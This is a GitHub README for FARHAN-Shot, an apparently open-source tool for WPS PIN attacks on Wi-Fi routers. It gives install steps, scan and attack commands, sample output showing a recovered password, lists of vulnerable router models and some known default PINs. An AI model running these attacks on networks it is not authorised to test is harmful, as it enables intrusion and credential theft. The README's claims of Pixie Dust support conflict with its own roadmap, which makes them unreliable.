# FARHAN-SHOT v2.0 🎯

**Modern WPS WiFi Penetration Testing Tool**

[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
[![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-yellow.svg)](LICENSE)

Run WPS PIN attacks (Pixie Dust, online bruteforce, PIN prediction) without monitor mode using wpa_supplicant.

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED PENETRATION TESTING ONLY**

This tool is created exclusively for:
- Security research and education
- Authorized penetration testing
- Testing your own networks
- Learning about WPS vulnerabilities

**Unauthorized access to computer networks is illegal.** Always obtain explicit written permission before testing any network you don't own. The developers assume no liability for misuse of this software.

---

## ✨ Features

### 🎯 Advanced Attack Capabilities
- **Multiple PIN Algorithms**: ComputePIN, 24/28/32-bit, Vendor-specific PINs
- **Smart PIN Generation**: Confidence-based prioritization
- **Online Bruteforce**: Intelligent PIN testing with delays
- **No Monitor Mode Required**: Uses wpa_supplicant for compatibility
- **Vulnerability Database**: 16+ vulnerable router entries (TP-Link, D-Link, ASUS, Netgear, Realtek)

### 🎨 Terminal UI (Original FARHAN-Shot Style)
- **ANSI Color-Coded Output**: Green [+], Red [-], Yellow [!], Blue [i], Cyan [?]
- **Network Table Display**: Signal strength, WPS status, vulnerability levels
- **Real-Time Attack Progress**: PIN testing with confidence scores
- **Success/Failure Indicators**: Clear colored status messages

### 📊 Comprehensive Database
- **TP-Link**: Archer series, TL-WR series (2025 confirmed vulnerable)
- **D-Link**: DIR-605L, DIR-615, DIR-809, DIR-819
- **ASUS**: RT-N12, RT-AC51U, RT-AC52U, RT-AC series
- **Netgear**: JWNR2000v2, R6220, WN3000RP
- **Realtek Chipsets**: RTL8xxx series (high vulnerability)

---

## 🚀 Installation

### Prerequisites

**System Requirements:**
- Linux (Kali, Ubuntu, Debian) or Android (Termux)
- Python 3.6 or higher
- Root/sudo access (for wireless operations)

**Required Packages:**
```bash
# Debian/Ubuntu/Kali
sudo apt update
sudo apt install -y python3 wpasupplicant iw pixiewps

# Optional (for advanced features)
sudo apt install -y aircrack-ng reaver
```

### Quick Install

```bash
# Clone repository
git clone https://github.com/Porter-union-rom-updates/FARHAN-Shot.git
cd FARHAN-Shot

# Make executable
chmod +x main.py

# Run
python3 main.py --help
```

### Termux (Android) Installation

```bash
# Install required packages
pkg update
pkg install -y python root-repo
pkg install -y wpasupplicant iw

# Clone and setup
git clone https://github.com/Porter-union-rom-updates/FARHAN-Shot.git
cd FARHAN-Shot

# Requires rooted device
su
python main.py --help
```

---

## 📖 Usage

### Basic Commands

#### 1. Scan for Networks
```bash
# Scan with interface
sudo python main.py scan -i wlan0

# Verbose output
sudo python main.py scan -i wlan0 -v
```

**Output Example:**
```
[i] Scanning networks on wlan0...
[+] Found 12 networks
================================================================================
#    SSID                      BSSID              CH   Signal   WPS    Vuln
================================================================================
1    TP-Link_Home              AA:BB:CC:DD:EE:FF  6    -45dBm   YES    HIGH
2    D-Link_WiFi               11:22:33:44:55:66  11   -62dBm   YES    HIGH
3    MyNetwork                 99:88:77:66:55:44  1    -78dBm   NO     LOW
================================================================================
```

#### 2. Attack Target Network
```bash
# Attack with BSSID
sudo python main.py attack -i wlan0 -b AA:BB:CC:DD:EE:FF

# Limit PIN attempts
sudo python main.py attack -i wlan0 -b AA:BB:CC:DD:EE:FF -m 15

# Verbose attack
sudo python main.py attack -i wlan0 -b AA:BB:CC:DD:EE:FF -v
```

**Attack Output:**
```
[i] Generating PIN candidates for AA:BB:CC:DD:EE:FF...
[+] Generated 20 PIN candidates
[i] Top PINs by confidence:
   1. 12345670 - ComputePIN (70%)
   2. 87654321 - 24-bit PIN (65%)
   3. 00000000 - Common PIN (30%)

[?] Trying PIN 1/20: 12345670 (ComputePIN)...
[?] Trying PIN 2/20: 87654321 (24-bit PIN)...
```

#### 3. View Tool Information
```bash
python main.py info
```

---

## 🎯 Attack Workflow Example

### Complete Attack Session
```bash
# Step 1: Scan for targets
sudo python main.py scan -i wlan0

# Output shows vulnerable targets:
# 1  TP-Link_Home  AA:BB:CC:DD:EE:FF  6   -45dBm   YES    HIGH

# Step 2: Attack the vulnerable target
sudo python main.py attack -i wlan0 -b AA:BB:CC:DD:EE:FF

# Tool will:
# - Generate 20+ PIN candidates
# - Prioritize by confidence
# - Test each PIN with delays
# - Display real-time progress
# - Save results on success

# On success:
# ============================================================
# ✓ ATTACK SUCCESSFUL!
# ============================================================
# [+] SSID: TP-Link_Home
# [+] BSSID: AA:BB:CC:DD:EE:FF
# [+] WPS PIN: 12345670
# [+] Password: MySecurePassword123
# [+] Duration: 3.2s
# ============================================================
```

---

## 🎨 UI Color Scheme

The tool uses the **original FARHAN-Shot ANSI color scheme**:

| Indicator | Color | Meaning |
|-----------|-------|---------|
| `[+]` | Green | Success / OK |
| `[-]` | Red | Error / Failed |
| `[?]` | Cyan | Question / Prompt |
| `[i]` | Blue | Information |
| `[!]` | Yellow | Warning |

**Vulnerability Levels:**
- **RED**: High vulnerability (90%+ success rate)
- **YELLOW**: Medium vulnerability (50-90% success rate)
- **WHITE**: Low vulnerability (<50% success rate)

---

## 🔧 Advanced Configuration

### PIN Generation Algorithms

The tool implements multiple PIN generation algorithms:

1. **ComputePIN** (Zaochesung algorithm) - 70% confidence
2. **24-bit PIN** - 65% confidence
3. **28-bit PIN** - 65% confidence
4. **32-bit PIN** - 65% confidence
5. **Vendor-specific PINs** - 95% confidence (when known)
6. **Common PINs** - 30% confidence

### Vendor-Specific PINs

```python
# Known vulnerable devices with specific PINs
"94103E": ["20456008", "12345670"],  # Belkin
"EC1A59": ["20456008", "12345670"],  # Belkin
"282850": ["28296607", "12345670"],  # ZyXEL
```

---

## 🛡️ Known Vulnerable Devices (2025)

### High-Risk Routers

**TP-Link** (2025 Confirmed)
- Archer C20, C50, C5, C7, C9
- TL-WR740N, TL-WR741ND, TL-WR840N, TL-WR841N
- Archer MR200 (LTE Router)
- WiFi 6 models (AX series)

**D-Link**
- DIR-605L, DIR-615, DIR-809, DIR-819
- DIR-850L, DIR series (multiple models)

**ASUS**
- RT-N12, RT-N14U, RT-N16
- RT-AC51U, RT-AC52U, RT-AC58U
- RT-AC series (various models)

**Netgear**
- JWNR2000v2
- R6220, R6230
- WN3000RP V3 (Range Extender)

**Realtek Chipsets**
- RTL8188, RTL8192 series
- High vulnerability across multiple devices

---

## 🔍 Troubleshooting

### Common Issues

#### "iw not found"
```bash
sudo apt install iw
```

#### "Permission denied"
```bash
# Run with sudo
sudo python main.py scan -i wlan0
```

#### "No networks found"
```bash
# Check interface is up
sudo ip link set wlan0 up

# Verify interface name
iw dev

# Try different interface
sudo python main.py scan -i wlan1
```

#### "wpa_supplicant not found"
```bash
sudo apt install wpasupplicant
```

---

## 📁 File Structure

```
FARHAN-Shot/
├── main.py              # Main tool (all-in-one file)
├── README.md            # This file
├── LICENSE              # GPL-3.0 License
└── .gitignore           # Git ignore file
```

**Results are saved to:**
```
~/.farhan_shot/results.txt
```

---

## 🤝 Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Add your improvements
4. Submit a pull request

**Contribution Ideas:**
- Add more PIN algorithms
- Expand vulnerability database
- Improve attack efficiency
- Add new features
- Bug fixes

---

## 📚 References & Credits

### Inspiration & Research
- **OneShot**: Original wpa_supplicant-based WPS attack tool
- **Reaver**: Classic WPS attack tool
- **wpspin**: PIN generation algorithms
- **Pixiewps**: Offline WPS PIN cracker

### Original Author
- **FARHAN MUH TASIM** (@Gtajisan)

### Algorithm Sources
- ComputePIN (Zaochesung)
- 3WiFi PIN database
- Various security research papers

---

## 📜 License

This project is licensed under the **GPL-3.0 License** - see the [LICENSE](LICENSE) file for details.

**YOU ARE RESPONSIBLE FOR YOUR ACTIONS.**

The developers:
- Do NOT condone illegal use
- Assume NO liability for misuse
- Provide this tool for learning and authorized testing ONLY

---

## 🌟 Features Roadmap

### v2.1 (Upcoming)
- [ ] Actual Pixie Dust attack implementation
- [ ] Full wpa_supplicant integration
- [ ] Automated mass scanning
- [ ] Additional PIN algorithms
- [ ] Enhanced vulnerability database

### v2.2 (Future)
- [ ] GUI interface option
- [ ] Docker containerization
- [ ] Network topology mapping
- [ ] Custom wordlist support

---

## 📞 Support

**For legitimate security research and educational questions:**
- Open an issue on GitHub
- Follow responsible disclosure practices
- Test only on networks you own or have permission to test

---

## ⭐ Acknowledgments

Special thanks to:
- The information security research community
- All contributors and testers
- Open-source WPS attack tool developers
- Wireless security researchers worldwide

---

<div align="center">

**FARHAN-SHOT v2.0** - Modern WiFi Penetration Testing  
*For Education & Authorized Testing Only*

**Original style preserved with modern improvements**

</div>
